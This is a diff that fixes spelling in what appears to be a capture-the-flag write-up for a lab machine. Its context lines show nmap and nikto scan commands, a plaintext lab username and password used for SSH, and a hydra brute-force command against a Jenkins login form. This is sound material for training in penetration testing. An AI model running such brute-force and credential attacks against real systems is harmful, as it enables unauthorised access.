@@ -24,7 +24,7 @@ nmap -sC -sV $IP
 nikto -h $IP
 ```
 
-### Namp
+### Nmap
 
 ```sh
 nmap -sC -sV $IP
@@ -230,7 +230,7 @@ aubreanna:bubb13guM!@#123
 
 So let's login via aubreanna: ```ssh aubreanna@10.10.156.30``` and we find the first flag (user.txt) in the home dir.
 
-Unfortunantly ```sudo -l``` is not allowed
+Unfortunately ```sudo -l``` is not allowed
 
 ```sh
 aubreanna@internal:~$ sudo -l
@@ -301,7 +301,7 @@ We can the open jenkins from your kali machine e.g. http://localhost:31340 and a
 
 ![_internal_burpsuite](_internal_burpsuite.jpg)
 
-Using the information from the intercepted post command of a failed login attempt we can build the hdyra bruteforce attack:
+Using the information from the intercepted post command of a failed login attempt we can build the hdyra brute-force attack:
 
 ```sh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 31340 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:F=Invalid"
